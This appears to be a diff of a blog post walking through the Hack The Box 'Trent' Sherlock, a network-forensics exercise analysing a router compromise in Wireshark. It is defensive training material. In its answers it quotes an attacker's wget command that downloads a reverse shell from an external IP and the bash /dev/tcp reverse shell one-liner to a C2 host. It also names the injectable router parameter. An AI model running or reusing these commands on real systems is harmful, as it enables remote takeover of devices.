@@ -2,17 +2,17 @@
 title: PCAP Analysis - Hack The Box Sherlock
 layout: post
 categories: [projects, write-ups]
+tags: [wireshark, threat-detection, hack-the-box, network-forensics]
 date: 2025-05-26 00:00:00 +0530
 description: This writeup is a walkthrough of the “Trent” Sherlock from Hack The Box, an investigative challenge testing defensive security skills. Using Wireshark, I analyzed a PCAP file to uncover an attacker’s Techniques, Tactics, and Procedures (TTPs) during a lateral movement attack targeting router firmware.
 ---
 
-# PCAP Analysis: Hack The Box Sherlock Trent
-
-*Published: May 26, 2025*
-
 ## Project Overview
 
 This writeup is a walkthrough of the “Trent” Sherlock from Hack The Box, an investigative challenge testing defensive security skills. Using Wireshark, I analyzed a PCAP file to uncover an attacker’s Techniques, Tactics, and Procedures (TTPs) during a lateral movement attack targeting router firmware. The analysis reveals the attacker’s IP, compromised router details, login attempts, and exploitation of a remote code execution vulnerability, demonstrating my network forensics and threat detection capabilities critical for a Security Operations Center (SOC) analyst role.
+
+![HTB Banner](/assets/img/pcap-analysis/final%20banner.png)
+_Hack The Box Sherlock Trent: Investigating lateral movement and router compromise_
 
 ## Sherlock Scenario
 
@@ -29,77 +29,156 @@ The SOC team detected suspicious lateral movement within the network, targeting 
 
 The analysis addresses 12 questions to unravel the attack. Below are the findings, supported by Wireshark screenshots and filters.
 
-### Q1: Attacker’s Initial IP Address
+### Q1: From what IP address did the attacker initially launched their activity?
 
-Loaded the PCAP in Wireshark and navigated to *Statistics > Conversations > IPv4*. Sorting packets from highest to lowest showed significant traffic between the router (192.168.10.1) and the attacker (192.168.10.2).
+- Load the PCAP file into Wireshark
+- Go to Statistics > Conversations > IPv4
 
-**Answer**: 192.168.10.2
+![Wireshark Conversations](/assets/img/pcap-analysis/q1_01.png)
+_Wireshark Conversations tab highlighting attacker IP_
 
-### Q2: Model Name of Compromised Router
+- Sorting the packets tab from highest to lowest, we can see there are a huge number or packets being transferred between `192.168.10.1` (The Router) and `192.168.10.2` (The Attacker)
 
-Filtered HTTP packets between the router and attacker using `ip.addr==192.168.10.2 && ip.addr==192.168.10.1 && http`. Following the TCP stream of packet 13 (first HTTP packet) revealed the router’s model in the response.
+> Answer: 192.168.10.2
+{: .prompt-info }
 
-**Answer**: TEW-827DRU
+### Q2: What is the model name of the compromised router?
 
-### Q3: Number of Failed Login Attempts
+- I used the following filter to show only the HTTP packets transferred between the router and the attacker machines
+`ip.addr==192.168.10.2 && ip.addr==192.168.10.1 && http`
 
-Filtered HTTP POST requests from the attacker to the router using `ip.src==192.168.10.2 && ip.dst==192.168.10.1 && http.request.method==POST`. The first three POST requests failed, but the fourth (packet 22826) succeeded, indicating two failed attempts.
+![Wireshark Conversations](/assets/img/pcap-analysis/q2_01.png)
+_HTTP packets between attacker and router_
 
-**Answer**: 2 failed login attempts
+- Following the TCP stream from packet 13 (the first packet after my filter query) and going through the response from the router, we can see the model name of the victim’s router.
 
-### Q4: UTC Time of Successful Login
+![Wireshark Conversations](/assets/img/pcap-analysis/q2_02.png)
+_TCP Stream revealing router model_
 
-From Q3, packet 22826 marked the successful login. Changed Wireshark’s time format (*View > Time Display Format > UTC Date and Time of Day*) to view the timestamp.
+> Answer: TEW-827DRU
+{: .prompt-info }
 
-**Answer**: 2024-05-01 15:53:27
+### Q3: How many failed login attempts did the attacker try before successfully logging into the router?
 
-### Q5: Length of Successful Login Password
+- Authentication is done over HTTP, using a POST request. I use this filter to only show the HTTP requests that use the POST method
+`ip.src==192.168.10.2 && ip.dst==192.168.10.1 && http.request.method==POST`
 
-From Q3, the successful login packet (22826) showed the credentials. The password field was empty.
+![Wireshark Conversations](/assets/img/pcap-analysis/q3_01.png)
+_POST requests showing login attempts_
 
-**Answer**: 0 (empty string)
+- As visible in the above image, the top 3 packets are the Attacker’s attempts at logging in, but it’s the fourth POST request which shows that they were actually logged in when that request was sent, which means the attacker was successfully logged into the router after 2 failed attempts, packet 22826 being his successful login
 
-### Q6: HTTP Parameter for Remote Code Execution
+![Wireshark Conversations](/assets/img/pcap-analysis/q3_02.png)
+_Packet 22826 confirming successful login_
 
-Examined POST requests post-login, identifying commands passed via the `usbapps.config.smb_admin_name` parameter in HTTP forms, enabling remote code execution.
+> Answer: 2 failed login attempts
+{: .prompt-info }
 
-**Answer**: usbapps.config.smb_admin_name
+### Q4: At what UTC time did the attacker successfully log into the routers web admin interface?
 
-### Q7: CVE Number of Exploited Vulnerability
+- From the above question, we know the Attacker successfully logged into the router in packet 22826
 
-Researched the router model (TEW-827DRU) and RCE vulnerability, identifying the associated CVE.
+> Note: the default time display format in Wireshark is seconds since first captured packet, which can be changed to a more easy-to-understand format by going to View > Time Display Format > UTC Date and Time of Day
+{: .prompt-tip }
 
-**Answer**: CVE-2024-28353
+![Wireshark Conversations](/assets/img/pcap-analysis/q4_01.png)
+_Packet 22826 timestamp in UTC_
 
-### Q8: Current Firmware Version
+> Answer: 2024-05-01 15:53:27
+{: .prompt-info }
+
+### Q5: How many characters long was the password used to log in successfully?
+
+- From Question 3, we can see the credentials the Attacker has used to log into the router
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q5_01.png)
+_Credentials showing empty password_
+
+> Answer: 0 (empty string)
+{: .prompt-info }
+
+### Q6: Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?
+
+- Checking other POST requests made by the Attacker, there are several requests where the Attacker is seen trying to execute commands by passing commands in a form item in their HTTP POST request
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q6_01.png)
+_POST request with RCE parameter_
+
+> Answer: usbapps.config.smb_admin_name
+{: .prompt-info }
+
+### Q7: What is the CVE number associated with the vulnerability that was exploited in this attack?
+
+- Since we know the Attacker got remote code execution and we know the router model, so looking that up on the web can help us find the CVE number
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q7_01.png)
+_Web search confirming CVE_
+
+> Answer: CVE-2024-28353
+{: .prompt-info }
+
+### Q8: What is the current firmware version installed on the compromised router?
 
 Found the firmware version in the router’s HTTP response.
 
-**Answer**: 2.10B01
+![Wireshark Conversations](/assets/img/pcap-analysis/q8_01.png)
+_Router response showing firmware_
 
-### Q9: First Command Executed via Vulnerability
+> Answer: 2.10B01
+{: .prompt-info }
+
+### Q9: What was the first command the attacker executed by exploiting the vulnerability?
 
 Reviewed POST requests after login, identifying the first command in the `usbapps.config.smb_admin_name` parameter.
 
-**Answer**: whoami
+![Wireshark Conversations](/assets/img/pcap-analysis/q9_01.png)
+_First command via RCE_
 
-### Q10: Command to Download Reverse Shell
+> Answer: whoami
+{: .prompt-info }
+
+### Q10: What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?
 
 Identified a POST request with a `wget` command to download a reverse shell script.
 
-**Answer**: wget http://35.159.25.253:8000/a1l4m.sh
+![Wireshark Conversations](/assets/img/pcap-analysis/q10_01.png)
+_Command downloading reverse shell_
 
-### Q11: Server Response for Typo in Injection
+> Answer: wget http://35.159.25.253:8000/a1l4m.sh
+{: .prompt-info }
+
+### Q11: Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?
 
 Followed HTTP streams of failed `wget` attempts, noting the server’s response to a typo.
 
-**Answer**: Access to this resource is forbidden
+![Wireshark Conversations](/assets/img/pcap-analysis/q11_01.png)
+_Server response to typo_
 
-### Q12: C2 Server IP and Port
+> Answer: Access to this resource is forbidden
+{: .prompt-info }
 
-Analyzed the successful reverse shell download (packet with `a1l4m.sh`). Followed the HTTP stream to extract the script, revealing a reverse shell command pointing to the C2 server.
+### Q12: What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)
 
-**Answer**: 35.159.25.253:41143
+- Looking at this packet from our list of POST requests, it is evident the Attacker was able to download his reverse shell script using the remote code execution on this router
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q12_01.png)
+_Packet downloading reverse shell_
+
+- So we follow this packet’s HTTP stream to see what this file contains. The way a reverse shell script works is by exploiting the remote code execution vulnerability to spawn a bash shell while pointing to a specific IP address and port number (Attacker’s machine)
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q12_02.png)
+_Reverse shell script contents_
+
+- The very next HTTP request after the request which downloaded the script was a GET request with the name of the script that the Attacker was seen downloading earlier. Follow that packet’s HTTP stream to investigate further makes things much clearer
+
+![Wireshark Conversations](/assets/img/pcap-analysis/q12_03.png)
+_HTTP stream confirming C2 server_
+
+- `a1l4m.sh`  is a file with a reverse shell one-liner command `bash -i > /dev/tcp/35.159.25.253/41143 0<&1 2>&1`
+- This reverse shell commands clearly gives away the IP Address and Port number of the Command and Control (C2) server, the address to which this reverse shell would connect to.
+
+> Answer: 35.159.25.253:41143
+{: .prompt-info }
 
 ## Conclusion
 
